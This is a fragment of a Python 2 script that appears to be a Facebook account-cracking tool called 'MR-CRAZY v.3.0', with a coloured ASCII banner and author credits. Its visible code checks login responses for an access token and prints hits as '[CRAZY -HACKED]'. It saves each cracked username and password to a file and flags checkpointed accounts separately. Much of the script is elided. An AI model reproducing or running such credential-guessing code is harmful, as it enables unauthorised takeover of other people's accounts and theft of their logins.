...
\033[0;94m  __  __ ___      ___ ___    _    ______   __
\033[0;94m |  \/  | _ \___ / __| _ \  /_\  |_  /\ \ / /
\033[0;96m | |\/| |   /___| (__|   / / _ \  / /  \ V /
\033[0;96m |_|  |_|_|_\    \___|_|_\/_/ \_\/___|  |_|  v.3.0
""")

print("\033[0;91mThis Tool's Free By MAHIN Vai")
...
\033[0;94m |  \/  | _ \___ / __| _ \  /_\  |_  /\ \ / /
\033[0;96m | |\/| |   /___| (__|   / / _ \  / /  \ V /
\033[0;96m |_|  |_|_|_\    \___|_|_\/_/ \_\/___|  |_|  
"""
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : MAHIN AHMED'
    print '\033[0;94mFACEBOOK : MAHIN AHMED '
    print '\033[0;96mGITHUB   : MAHIN-XD'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[CRAZY -HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CRAZY -CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
